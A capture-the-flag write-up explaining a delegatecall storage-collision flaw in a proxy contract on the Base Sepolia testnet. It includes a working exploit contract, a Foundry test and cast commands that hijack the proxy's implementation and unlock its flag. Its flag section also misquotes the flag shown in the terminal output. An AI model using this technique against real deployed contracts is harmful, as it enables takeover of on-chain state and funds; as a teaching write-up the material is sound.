---
title: "Security Club of Kimathi CTF"
subtitle: "⚡it was a cool ctf and i got various chall' that were very cool and juicy!!⚡"
summary: "* cool and juicy!!*"
date: 2025-06-16
cardimage: block.png
featureimage: block.webp
caption: ctf
authors:
  - Havoc: logo.png
---

## Challenge Description

The challenge, "The Phantom's Masquerade," involves a smart contract deployed on Base Sepolia at `0x85aD671D00348eA2924e7472A678dD085b4B1Dd4`. The goal is to "unmask the phantom and reveal its true nature to claim the hidden treasure." The challenge hints point towards `delegatecall` and storage layout confusion.
## Vulnerability Analysis

The `ProxyMaster` contract acts as a proxy, forwarding calls to an `implementation` address using `delegatecall`. The relevant parts of the `ProxyMaster` contract are:

```solidity

contract ProxyMaster {

address public implementation;

bool private unlocked;

  

constructor(address _implementation) {

implementation = _implementation;

}

  

function execute(bytes calldata data) external returns (bytes memory) {

(bool success, bytes memory result) = implementation.delegatecall(data);

require(success, "Execution failed");

return result;

}

  

function setImplementation(address newImpl) external {

// In a real proxy, this would be restricted

implementation = newImpl;

}

  

function getFlag() external view returns (string memory) {

require(unlocked, "The phantom remains masked, its secrets hidden!");

return "***REDACTED***";

}

  

function isUnlocked() external view returns (bool) {

return unlocked; // Has the phantom been unmasked?

}

}

```

The key vulnerability lies in the `setImplementation` function, which is not restricted and allows anyone to change the `implementation` address. This, combined with the `delegatecall` in the `execute` function, creates a classic proxy vulnerability known as "storage collision" or "storage layout confusion."

When `delegatecall` is used, the code of the `implementation` contract is executed in the context of the `ProxyMaster` contract. This means that any state variables accessed by the `implementation` contract will actually modify the storage of the `ProxyMaster` contract.

Let's examine the storage layout of `ProxyMaster`:

- `implementation` (address) is at storage slot 0.

- `unlocked` (bool) is at storage slot 1.

Our goal is to set `unlocked` to `true` to call `getFlag()`.
## Exploit Strategy

The exploit strategy involves the following steps:

1. Deploy a malicious `ExploitImplementation` contract.

2. The `ExploitImplementation` contract will have a state variable at storage slot 1 that we can control. This variable will overwrite the `unlocked` variable in the `ProxyMaster` contract when a `delegatecall` is made.

3. Call `setImplementation` on the `ProxyMaster` contract to point its `implementation` to our deployed `ExploitImplementation` contract.

4. Call the `execute` function on the `ProxyMaster` contract, passing in the calldata to call a function in our `ExploitImplementation` that sets its storage slot 1 variable to `true`.

5. Since `delegatecall` is used, this will effectively set the `unlocked` variable in `ProxyMaster` to `true`.

6. Finally, call `getFlag()` on the `ProxyMaster` contract to retrieve the flag.
## Exploit Implementation

### `ExploitImplementation.sol`

We create a simple contract `ExploitImplementation` with a `bool` variable `newUnlocked` at storage slot 1 (to align with `ProxyMaster`'s `unlocked` variable) and a function `setUnlocked` to modify it.

```solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

  

contract ExploitImplementation {

address public dummy; // This will occupy storage slot 0, aligning with 'implementation' in ProxyMaster

bool public newUnlocked; // This will occupy storage slot 1, aligning with 'unlocked' in ProxyMaster

  

function setUnlocked(bool _newUnlocked) external {

newUnlocked = _newUnlocked;

}

}

```

### Foundry Test (`ProxyMaster.t.sol`)

To test the exploit locally, we use Foundry. We fork the Base Sepolia network and interact with the deployed `ProxyMaster` contract.


```solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

  

import "forge-std/Test.sol";

import "forge-std/console.sol";

import "./ProxyMaster.sol";

import "./ExploitImplementation.sol";

  

contract ProxyMasterTest is Test {

ProxyMaster proxyMaster;

ExploitImplementation exploitImplementation;

  

address constant PROXY_ADDRESS = 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4;

  

function setUp() public {

vm.createSelectFork("https://sepolia.base.org");

proxyMaster = ProxyMaster(PROXY_ADDRESS);

exploitImplementation = new ExploitImplementation(); // Deploy our exploit contract locally

}

  

function testExploit() public {

console.log("Initial unlocked state:", proxyMaster.isUnlocked());

  

// Step 1: Set the implementation of the proxy to our ExploitImplementation contract

proxyMaster.setImplementation(address(exploitImplementation));

  

// Step 2: Encode the call to setUnlocked(true) from our ExploitImplementation

bytes memory payload = abi.encodeWithSelector(exploitImplementation.setUnlocked.selector, true);

  

// Step 3: Call the execute function on the proxy with the payload

// This will execute setUnlocked(true) in the context of ProxyMaster, modifying its 'unlocked' state variable

proxyMaster.execute(payload);

  

console.log("Final unlocked state:", proxyMaster.isUnlocked());

  

// Step 4: Verify that the unlocked variable in ProxyMaster is now true

assertTrue(proxyMaster.isUnlocked(), "Proxy should be unlocked");

  

// Step 5: Get the flag

string memory flag = proxyMaster.getFlag();

emit log_string(flag);

}

}

```
## Execution Steps and Terminal Outputs

Here are the terminal outputs for each significant step of the exploit. You can use these to create your own screenshots if desired.
### 1. Initializing Foundry Project

```

ubuntu@sandbox:~ $ cd /home/ubuntu/foundry_challenge && forge init foundry_challenge

Initializing /home/ubuntu/foundry_challenge...

Installing forge-std in /home/ubuntu/foundry_challenge/lib/forge-std (url: Some("https://github.com/foundry-rs/forge-std"), tag: None)

Cloning into '/home/ubuntu/foundry_challenge/lib/forge-std'...

remote: Enumerating objects: 2126, done.

remote: Counting objects: 100% (1008/1008), done.

remote: Compressing objects: 100% (131/131), done.

remote: Total 2126 (delta 932), reused 879 (delta 877), pack-reused 1118 (from 2)

Receiving objects: 100% (2126/2126), 720.75 KiB | 25.74 MiB/s, done.

Resolving deltas: 100% (1431/1431), done.

Installed forge-std v1.9.7

Initialized forge project

ubuntu@sandbox:~/foundry_challenge $

```
### 2. Building Foundry Project

```

ubuntu@sandbox:~ $ cd /home/ubuntu/foundry_challenge && forge build

[⠊] Compiling... Compiling...

[⠒] Compiling 26 files with Solc 0.8.30

[⠰] Installing Solc version 0.8.30lc version 0.8.30lc version 0.8.30

[⠆] Successfully installed Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30

[⠰] Solc 0.8.30 finished in 1.03s

Compiler run successful!

ubuntu@sandbox:~/foundry_challenge $

```

### 3. Running Foundry Tests (Initial Attempt - Before `setImplementation`)


```

ubuntu@sandbox:~ $ cd /home/ubuntu/foundry_challenge && forge test --fork-url https://sepolia.base.org

[⠊] Compiling... Compiling...

No files changed, compilation skipped

Ran 2 tests for test/Counter.t.sol:CounterTest

[PASS] testFuzz_SetNumber(uint256) (runs: 256, μ: 32198, ~: 32354)

[PASS] test_Increment() (gas: 31851)

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 153.43ms (12.21ms CPU time)

Ran 1 test for src/ProxyMaster.t.sol:ProxyMasterTest

[FAIL: Proxy should be unlocked] testExploit() (gas: 16975)

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 195.29ms (32.50ms CPU time)

Ran 2 test suites in 262.32ms (348.72ms CPU time): 2 tests passed, 1 failed, 0 skipped (3 total tests)

Failing tests:

Encountered 1 failing test in src/ProxyMaster.t.sol:ProxyMasterTest

[FAIL: Proxy should be unlocked] testExploit() (gas: 16975)

Encountered a total of 1 failing tests, 2 tests succeeded

ubuntu@sandbox:~/foundry_challenge $

```

### 4. Running Foundry Tests (After adding `setImplementation`)


```

ubuntu@sandbox:~ $ cd /home/ubuntu/foundry_challenge && forge test --fork-url https://sepolia.base.org

[⠊] Compiling... Compiling...

[⠑] Compiling 1 files with Solc 0.8.30 with Solc 0.8.30 with Solc 0.8.30 with Solc 0.8.30 with Solc 0.8.30 with Solc 0.8.30 with Solc 0.8.30

[⠘] Solc 0.8.30 finished in 658.16ms

Compiler run successful!

Ran 2 tests for test/Counter.t.sol:CounterTest

[PASS] testFuzz_SetNumber(uint256) (runs: 256, μ: 32043, ~: 32354)

[PASS] test_Increment() (gas: 31851)

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 186.78ms (13.28ms CPU time)

Ran 1 test for src/ProxyMaster.t.sol:ProxyMasterTest

[PASS] testExploit() (gas: 35748)

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 240.80ms (48.35ms CPU time)

Ran 2 test suites in 296.42ms (427.58ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)

ubuntu@sandbox:~/foundry_challenge $

```

### 5. Deploying `ExploitImplementation` Contract

```

ubuntu@sandbox:~ $ cd /home/ubuntu/foundry_challenge && forge create src/ExploitImplementation.sol:ExploitImplementation --rpc-url https://sepolia.base.org --private-key <YOUR_PRIVATE_KEY> --broadcast

[⠊] Compiling... Compiling...

No files changed, compilation skipped

Deployer: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

Deployed to: 0x48443c12F9E3f39F70877ada091C0199a91c9a63

Transaction hash: 0xe6b71ebd387b823e92aab9cb9c075525d3623947a76617e6d5044625bbb49b7c

ubuntu@sandbox:~/foundry_challenge $

```

*(Note: Replace `<YOUR_PRIVATE_KEY>` with your actual private key. The deployed address `0x48443c12F9E3f39F70877ada091C0199a91c9a63` will be used in subsequent steps.)*
### 6. Setting New Implementation Address for `ProxyMaster`

```

ubuntu@sandbox:~ $ cd /home/ubuntu && cast send --private-key <YOUR_PRIVATE_KEY> 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 "setImplementation(address)" 0x48443c12F9E3f39F70877ada091C0199a91c9a63 --rpc-url https://sepolia.base.org

blockHash 0x9ecd777db497b8398ae437cdd210f16e69302e75c7535f0421f49574aeae4049

blockNumber 27057008

contractAddress

cumulativeGasUsed 3395001

effectiveGasPrice 123093

from 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

gasUsed 26969

logs []

logsBloom 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

root

status 1 (success)

transactionHash 0x408f4b17f5ba8de0f4a47b45280c010555aeab7788707b07a1386d82719dee4f

transactionIndex 15

type 2

blobGasPrice

blobGasUsed

to 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4

l1BaseFeeScalar 1101

l1BlobBaseFee 1

l1BlobBaseFeeScalar 659851

l1Fee 1449772

l1GasPrice 822949

l1GasUsed 1600

ubuntu@sandbox:~ $

```

*(Note: Replace `<YOUR_PRIVATE_KEY>` with your actual private key.)*
### 7. Executing `setUnlocked(true)` via `ProxyMaster`


```

ubuntu@sandbox:~ $ cd /home/ubuntu && cast send --private-key <YOUR_PRIVATE_KEY> 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 "execute(bytes)" "$(cast calldata 'setUnlocked(bool)' true)" --rpc-url https://sepolia.base.org

blockHash 0xc29b2f5ff35930a91aa9f02c745a17376a0b9fe3832e7735d7f24b04b11ef510

blockNumber 27057016

contractAddress

cumulativeGasUsed 1626055

effectiveGasPrice 123158

from 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

gasUsed 31195

logs []

logsBloom 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

root

status 1 (success)

transactionHash 0x0f1fb6233fe882726d0c5e6c83e5b84dfc33ed6594c6155c522abc93ff1febb9

transactionIndex 8

type 2

blobGasPrice

blobGasUsed

to 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4

l1BaseFeeScalar 1101

l1BlobBaseFee 1

l1BlobBaseFeeScalar 659851

l1Fee 1477157

l1GasPrice 838494

l1GasUsed 1600

ubuntu@sandbox:~ $

```

*(Note: Replace `<YOUR_PRIVATE_KEY>` with your actual private key.)*

### 8. Verifying `isUnlocked()` State

```

ubuntu@sandbox:~ $ cd /home/ubuntu && cast call 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 "isUnlocked()(bool)" --rpc-url https://sepolia.base.org

true

ubuntu@sandbox:~ $

```

### 9. Retrieving the Flag

```

ubuntu@sandbox:~ $ cd /home/ubuntu && cast call 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 "getFlag()(string)" --rpc-url https://sepolia.base.org

"SCOK{d3l3g4t3c4ll_pr0xy_1337}"

ubuntu@sandbox:~ $

```

## Flag

The flag obtained is: `SCOK{d3l3l3g4t3c4ll_pr0xy_1337}`
## Conclusion

This challenge demonstrates a common vulnerability in upgradeable proxy contracts where insufficient access control on the `setImplementation` function, combined with the nature of `delegatecall` and storage slot collisions, can lead to unauthorized state modifications. By carefully crafting a malicious implementation contract that aligns its storage layout with the proxy's critical state variables, an attacker can take control of the proxy's state. This highlights the importance of robust access control and careful consideration of storage layout when designing upgradeable proxy patterns.